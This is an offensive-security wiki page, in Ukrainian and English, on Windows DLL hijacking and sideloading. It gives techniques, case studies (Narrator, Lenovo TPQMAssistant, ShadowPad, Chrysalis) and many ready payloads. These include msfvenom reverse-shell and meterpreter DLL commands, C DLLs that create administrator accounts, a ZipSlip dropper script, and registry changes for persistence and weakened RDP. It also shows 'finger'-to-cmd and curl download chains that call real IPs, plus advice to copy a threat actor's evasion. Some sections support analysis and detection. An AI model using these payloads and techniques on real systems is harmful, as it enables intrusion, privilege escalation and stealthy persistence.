# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Базова інформація

DLL Hijacking передбачає маніпулювання довіреним додатком так, щоб він завантажив шкідливу DLL. Цей термін охоплює кілька тактик, таких як **DLL Spoofing, Injection, and Side-Loading**. Зазвичай використовується для code execution, досягнення persistence і, рідше, privilege escalation. Незважаючи на фокус на escalation у цьому розділі, методика hijacking залишається однаковою для різних цілей.

### Поширені техніки

Існує кілька методів для DLL hijacking, кожен з яких ефективний залежно від стратегії завантаження DLL додатком:

1. **DLL Replacement**: Замінити справжню DLL на шкідливу, опційно використовуючи DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: Розмістити шкідливу DLL у каталозі, який перевіряється раніше ніж легітимний, експлуатуючи шаблон пошуку додатка.
3. **Phantom DLL Hijacking**: Створити шкідливу DLL, яку додаток спробує завантажити, думаючи, що це відсутня необхідна бібліотека.
4. **DLL Redirection**: Змінити параметри пошуку, такі як %PATH% або файли .exe.manifest / .exe.local, щоб перенаправити додаток на шкідливу DLL.
5. **WinSxS DLL Replacement**: Замінити легітимну DLL на шкідливу у каталозі WinSxS, метод часто пов’язаний з DLL side-loading.
6. **Relative Path DLL Hijacking**: Помістити шкідливу DLL у контрольовану користувачем папку разом зі скопійованим додатком, що нагадує техніки Binary Proxy Execution.

> [!TIP]
> Для покрокового ланцюжка, який поєднує HTML staging, AES-CTR configs та .NET implants поверх DLL sideloading, перегляньте workflow нижче.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Знаходження відсутніх DLL

Найпоширеніший спосіб знайти відсутні DLL у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із Sysinternals та **встановити** **наступні 2 фільтри**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

і просто показати **активність файлової системи**:

![](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні DLL в загальному**, залиште це запущеним на кілька **секунд**.\
Якщо ви шукаєте **відсутню DLL у конкретному виконуваному файлі**, слід додати **ще один фільтр, наприклад "Process Name" "contains" `<exec name>`, виконати його і зупинити захоплення подій**.

## Використання відсутніх DLL

Щоб escalate privileges, найкращий шанс — мати можливість **записати DLL, яку процес з підвищеними правами спробує завантажити**, у одне з місць, де вона буде шукатись. Тому ми можемо **записати** DLL у **папку**, де ця DLL шукається раніше, ніж папка з **оригінальною DLL** (рідкісний випадок), або можемо **записати у папку**, де DLL буде шукатись, і при цьому оригінальна **DLL не існує** ні в одній папці.

### Dll Search Order

**У документації Microsoft** можна знайти детальний опис того, як саме завантажуються DLL.

Windows-додатки шукають DLL, дотримуючись набору попередньо визначених шляхів пошуку, у певній послідовності. Проблема DLL hijacking виникає, коли шкідлива DLL стратегічно розміщена в одному з цих каталогів так, що її завантажують раніше за автентичну DLL. Просте рішення — переконатися, що додаток використовує абсолютні шляхи при посиланні на потрібні DLL.

Нижче наведено порядок пошуку DLL на 32-bit системах:

1. Каталог, звідки було завантажено додаток.
2. Системний каталог. Використовуйте функцію [GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), щоб отримати шлях до цього каталогу. (_C:\Windows\System32_)
3. 16-bit системний каталог. Немає функції для отримання шляху до цього каталогу, але він перевіряється. (_C:\Windows\System_)
4. Каталог Windows. Використовуйте функцію [GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), щоб отримати шлях до цього каталогу.
1. (_C:\Windows_)
5. Поточний каталог.
6. Каталоги, перелічені в змінній оточення PATH. Зверніть увагу, що це не включає шлях, специфічний для застосунку, вказаний ключем реєстру **App Paths**. Ключ **App Paths** не використовується при обчисленні шляху пошуку DLL.

Це **стандартний** порядок пошуку з увімкненим **SafeDllSearchMode**. Коли він вимкнений, поточний каталог піднімається на друге місце. Щоб відключити цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням увімкнено).

Якщо функцію [LoadLibraryEx](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликають з параметром **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі виконуваного модуля, який завантажує **LoadLibraryEx**.

Нарешті, зверніть увагу, що **DLL може бути завантажена за абсолютним шляхом, а не просто за іменем**. У такому випадку ця DLL **буде шукатись тільки в тому шляху** (якщо DLL має залежності, вони будуть шукатися як завантажені за іменем).

Існують інші способи змінити порядок пошуку, але я не буду їх тут пояснювати.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Використайте ProcMon фільтри (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`), щоб зібрати імена DLL, які процес перевіряє, але не знаходить.
2. Якщо бінарник запускається за **розкладом/сервісом**, поміщення DLL з одним із цих імен у **каталог додатка** (пункт порядку пошуку #1) призведе до її завантаження при наступному запуску. В одному випадку зі сканером на .NET процес шукав `hostfxr.dll` в `C:\samples\app\` перед тим, як завантажити реальну копію з `C:\Program Files\dotnet\fxr\...`.
3. Створіть payload DLL (наприклад reverse shell) з будь-яким експортом: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваша примітива — **ZipSlip-style arbitrary write**, сформуйте ZIP, чиїй запис виходить за межі каталогу розпакування, щоб DLL опинилася в папці додатка:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Передайте архів до відстежуваної папки/шару; коли плановане завдання знову запустить процес, він завантажить шкідливу DLL і виконає ваш код від імені облікового запису служби.

### Примусове sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath

Просунутий спосіб детерміновано впливати на шлях пошуку DLL для щойно створеного процесу — встановити поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу через нативні API ntdll. Вказавши тут директорію під контролем атакуючого, цільовий процес, який вирішує імпортовану DLL за ім'ям (без абсолютного шляху і не використовуючи безпечні прапори завантаження), можна змусити завантажити шкідливу DLL з цієї директорії.

Key idea
- Побудуйте параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть власний DllPath, який вказує на папку під вашим контролем (наприклад, директорію, де знаходиться ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий бінарний файл вирішує DLL за іменем, лоадер перевірятиме поданий DllPath під час розв'язання, що дозволяє надійну sideloading навіть якщо шкідлива DLL не розташована поруч із цільовим EXE.

Notes/limitations
- Це впливає на дочірній процес, що створюється; це відрізняється від SetDllDirectory, яка впливає лише на поточний процес.
- Ціль має імпортувати або викликати LoadLibrary для DLL за ім'ям (без абсолютного шляху і без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs та жорстко вказані абсолютні шляхи не можна перехопити. Forwarded exports і SxS можуть змінювати пріоритет.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Повний приклад на C: примусове sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Помістіть шкідливий xmllite.dll (exporting the required functions or proxying to the real one) у ваш каталог DllPath.
- Запустіть підписаний бінарний файл, відомий тим, що шукає xmllite.dll за іменем, використовуючи описану вище техніку. Завантажувач вирішує імпорт через вказаний DllPath і sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

У документації Windows зазначено певні винятки зі стандартного порядку пошуку DLL:

- Коли зустрічається **DLL, який має те саме ім'я, що й уже завантажений у пам'яті**, система оминає звичайний пошук. Натомість вона перевіряє редирект і манифест перед тим, як використовувати DLL, що вже в пам'яті. **У цьому сценарії система не виконує пошук цього DLL**.
- У випадках, коли DLL визнається **known DLL** для поточної версії Windows, система використовуватиме свою версію цього known DLL разом із будь-якими його залежними DLL, **уникнувши процесу пошуку**. Ключ реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список таких known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони вказані лише своїми **іменами модулів**, незалежно від того, чи початковий DLL був вказаний повним шляхом.

### Escalating Privileges

**Requirements**:

- Визначте процес, який працює або буде працювати з **іншими привілеями** (horizontal or lateral movement), який **не має DLL**.
- Переконайтеся, що є **права запису** для будь-якого **каталогу**, в якому **DLL** буде **шукатися**. Це місце може бути каталогом виконуваного файлу або каталогом у системному шляху.

Так, ці вимоги важко знайти, оскільки **за замовчуванням дивно знайти привілейований виконуваний файл без DLL**, і ще **більш дивно мати права запису в папці системного шляху** (за замовчуванням цього не можна). Але в неправильно налаштованих середовищах це можливо.\
Якщо вам пощастило і ви відповідаєте вимогам, можете перевірити проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **main goal of the project is bypass UAC**, ви можете знайти там **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи для всіх папок всередині PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити imports executable та exports dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного посібника про те, як **abuse Dll Hijacking to escalate privileges** за наявності прав запису в **System Path folder** перегляньте:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) перевірить, чи маєте ви права запису в будь-яку папку всередині system PATH.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості — це **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._

### Example

Якщо ви знайдете експлуатований сценарій, одна з найважливіших речей для успішного використання вразливості — **створити dll, яка експортує принаймні всі функції, які виконуваний файл буде імпортувати з неї**. Втім, зауважте, що Dll Hijacking корисний для того, щоб [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ви можете знайти приклад **як створити валідну dll** в цьому дослідженні з dll hijacking, зосередженому на dll hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Більше того, у **наступному розділі**n ви знайдете деякі **базові dll-коди**, які можуть бути корисними як **шаблони** або для створення **dll з експортованими необов'язковими функціями**.

## **Створення та компіляція Dlls**

### **Dll Proxifying**

В основному **Dll proxy** — це Dll, здатна **виконувати ваш шкідливий код під час завантаження**, але також **показувати** та **працювати** як **очікується**, **переспрямовуючи всі виклики до реальної бібліотеки**.

За допомогою інструменту [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви можете фактично **вказати виконуваний файл і вибрати бібліотеку**, яку хочете proxify, і **згенерувати proxified dll** або **вказати Dll** і **згенерувати proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86 я не бачив x64 версії):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ваш власний

Зверніть увагу, що в деяких випадках Dll, який ви компілюєте, повинен **export several functions**, які будуть завантажені victim process; якщо ці функції не існують, **binary won't be able to load** їх і **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна C DLL із точкою входу потоку</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Кейс: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe при запуску все ще перевіряє передбачувану, специфічну для мови локалізаційну DLL, яку можна захопити для виконання довільного коду та забезпечення персистентності.

Ключові факти
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Виявлення за допомогою Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC мовчання
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Хід атаки

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Почекайте, поки заплановане завдання не виконається о 9:30 ранку в контексті поточного користувача.
3. Якщо під час виконання завдання в системі залогінений адміністратор, шкідливий DLL запускається в сесії адміністратора з середнім рівнем цілісності.
4. Застосуйте стандартні методи обходу UAC, щоб підвищити привілеї зі середнього рівня (medium integrity) до SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process.

Chain overview
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Практичне sideloading за допомогою wsc_proxy.exe
- Помістіть ці два файли в ту саму папку:
- wsc_proxy.exe: легітимний підписаний хост (Avast). Процес намагається завантажити wsc.dll за ім'ям зі свого каталогу.
- wsc.dll: attacker DLL. Якщо не потрібні конкретні exports, DllMain може бути достатнім; інакше створіть proxy DLL і перенаправте потрібні exports до справжньої бібліотеки, запускаючи payload у DllMain.
- Створіть мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог до експорту використовуйте proxying framework (e.g., DLLirant/Spartacus) для генерування forwarding DLL, що також виконує ваш payload.

- Ця техніка покладається на розв'язання імен DLL хостовим бінарним файлом. Якщо хост використовує абсолютні шляхи або прапори безпечного завантаження (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не вдаватися.
- KnownDLLs, SxS, and forwarded exports можуть впливати на пріоритет і їх потрібно враховувати під час вибору хостового бінарника та набору експортів.

## Підписані триади + зашифровані payloads (ShadowPad case study)

Check Point описали, як Ink Dragon розгортає ShadowPad, використовуючи **three-file triad** щоб злитися з легітимним ПЗ, одночасно тримаючи основний payload зашифрованим на диску:

1. **Signed host EXE** – зловживають постачальниками, такими як AMD, Realtek, або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Атакувальники перейменовують виконуваний файл, щоб він виглядав як Windows-бінар (наприклад `conhost.exe`), але підпис Authenticode залишається дійсним.
2. **Malicious loader DLL** – скидається поруч із EXE з очікуваною назвою (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є MFC-бінаром, обфускованим за допомогою ScatterBrain framework; її єдине завдання — знайти зашифрований blob, розшифрувати його та відобразити ShadowPad рефлексивно.
3. **Encrypted payload blob** – часто зберігається як `<name>.tmp` в тій же директорії. Після відображення в пам'ять розшифрованого payload, loader видаляє TMP файл, щоб знищити судово-експертні докази.

Tradecraft notes:

* Перейменування підписаного EXE (зберігаючи оригінальний `OriginalFileName` у заголовку PE) дозволяє йому маскуватися під Windows-бінар, але зберігати підпис вендора; тож відтворюйте звичку Ink Dragon скидати `conhost.exe`-подібні бінари, що насправді є утилітами AMD/NVIDIA.
* Оскільки виконуваний файл залишається довіреним, більшість allowlisting controls вимагають лише, щоб ваш malicious DLL знаходився поруч із ним. Зосередьтеся на кастомізації loader DLL; підписаний батьківський файл зазвичай може запускатися без змін.
* ShadowPad’s decryptor очікує, що TMP blob буде поруч із loader і доступний для запису, щоб він міг занулити файл після відображення. Тримайте директорію записуваною до завантаження payload; після завантаження в пам'ять TMP файл можна безпечно видалити для OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Оператори поєднують DLL sideloading з LOLBAS так, що єдиним кастомним артефактом на диску є malicious DLL поруч із довіреним EXE:

- **Remote command loader (Finger):** Схований PowerShell порождає `cmd.exe /c`, забирає команди з Finger server і передає їх в `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` отримує TCP/79 текст; `| cmd` виконує відповідь сервера, дозволяючи операторам змінювати сервер другого етапу.

- **Built-in download/extract:** Завантажте архів з нешкідливим розширенням, розпакуйте його і підготуйте sideload target плюс DLL у випадковій папці `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` приховує прогрес і слідує за редиректами; `tar -xf` використовує вбудований у Windows tar.

- **WMI/CIM launch:** Запустіть EXE через WMI, щоб телеметрія показувала процес, створений через CIM, поки завантажується розташований поруч DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Працює з бінарниками, що віддають перевагу локальним DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) працює під довіреною назвою.

- **Hunting:** Тригерити на `forfiles`, коли `/p`, `/m` і `/c` з'являються разом; це рідко трапляється поза адмінськими скриптами.


## Кейс: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Нещодавнє вторгнення Lotus Blossom зловживало довіреним ланцюжком оновлень для доставки NSIS-пакованого dropper, який підготував DLL sideload та повністю in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, ставить йому атрибут **HIDDEN**, скидає перейменований Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` і зашифрований blob `BluetoothService`, після чого запускає EXE.
- Host EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` завантажує blob через mmap; `LogWrite` розшифровує його кастомним LCG-based stream (константи **0x19660D** / **0x3C6EF35F**, ключовий матеріал отримано з попереднього хешу), перезаписує буфер plaintext shellcode, звільняє тимчасові дані і переходить до нього.
- Щоб уникнути IAT, loader резолвить API шляхом хешування імен експорту використовуючи **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, потім застосовує Murmur-style avalanche (**0x85EBCA6B**) і порівнює з підсаленими цільовими хешами.

Main shellcode (Chrysalis)
- Розшифровує PE-подібний основний модуль, повторюючи add/XOR/sub з ключем `gQ2JR&9;` протягом п'яти проходів, потім динамічно завантажує `Kernel32.dll` → `GetProcAddress` для завершення резолюції імпортів.
- Відновлює рядки з іменами DLL під час виконання через побайтні bit-rotate/XOR трансформації, після чого завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий резольвер, який проходить **PEB → InMemoryOrderModuleList**, парсить кожну таблицю експорту блоками по 4 байти з Murmur-style змішуванням, і лише у випадку ненайденого хешу повертається до `GetProcAddress`.

Embedded configuration & C2
- Конфігурація міститься всередині скинутого файлу `BluetoothService` на **offset 0x30808** (розмір **0x980**) і розшифровується RC4 з ключем `qwhvb^435h&*7`, розкриваючи C2 URL і User-Agent.
- Beacons формують точково-розділений профіль хоста, додають префікс тег `4Q`, потім RC4-шифрують з ключем `vAuig34%^325hGV` перед `HttpSendRequestA` по HTTPS. Відповіді розшифровуються RC4 і розподіляються за допомогою tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + випадки chunked transfer).
- Режим виконання керується CLI args: без аргументів = встановлення persistence (service/Run key) що вказує на `-i`; `-i` перезапускає себе з `-k`; `-k` пропускає встановлення і запускає payload.

Спостережено альтернативний loader
